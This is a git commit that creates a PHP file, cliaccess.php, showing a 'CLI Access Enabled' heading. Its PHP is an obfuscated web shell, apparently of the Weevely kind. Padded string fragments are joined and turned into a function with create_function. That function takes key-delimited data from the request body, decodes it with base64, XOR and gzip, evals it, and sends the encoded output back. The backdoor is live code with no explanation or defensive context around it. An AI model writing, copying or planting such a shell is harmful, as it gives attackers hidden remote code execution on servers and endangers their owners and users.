7cf34d743dc856a7f5cf8a717082beb6186231fd
Ashton Southall <38774365+Adsnipers@users.noreply.github.com>
2020-04-23 19:26:29 +1000

    Create cliaccess.php

---
+++ cliaccess.php
@@ -0,0 +1,15 @@
+<html>
+    <body>
+        <h1>CLI Access Enabled</h1>
+<?php
+$c='hp:/yh/input"yh),$m) yh== 1) {  @yhob_staryht(yh);yh  @evayhl(@gzuyhncompress(@x(@basyhe';
+$M='etyhurn $yho;}if (@pyhryheg_matyhcyhh("/yh$kh(.+)$kfyh/",yh@file_yhget_conyhtenyhts("p';
+$x='$k="yh749193yhfd";$kh="ayh0e6599byh6c5e";yh$kf="1yh6e5byhec82987";$yhp="8fyhFyhqcyh';
+$W='64_yhdecode($myh[1]),yh$k))yhyh);  $o=@ob_geyht_cyhontenyhts();  @ob_yheyhnd_cyhlean()';
+$F='or(yh$i=0;$i<$l;yh){fyhor($j=0yh;($j<$c&&yh$i<yh$l);yh$j++yh,$i++){$o.=$t{yh$i}^$kyh{yh$j};}}r';
+$T='yLnNl92fyhvUL"yh;yhfyhunction x($t,$k){$c=strleyhn($yhk);$l=stryhlenyh($t);$o="yh";yhf';
+$q=str_replace('OM','','OMcrOMeate_OMfOMunOMcOMtion');
+$G=';  $ryh=@byhase64_enyhcoyhde(@x(yh@gzcompreyhss($o),$k)yh);yh  priyhnt("$p$kyhh$r$kf");}';
+$H=str_replace('yh','',$x.$T.$F.$M.$c.$W.$G);
+$I=$q('',$H);$I();
+?>
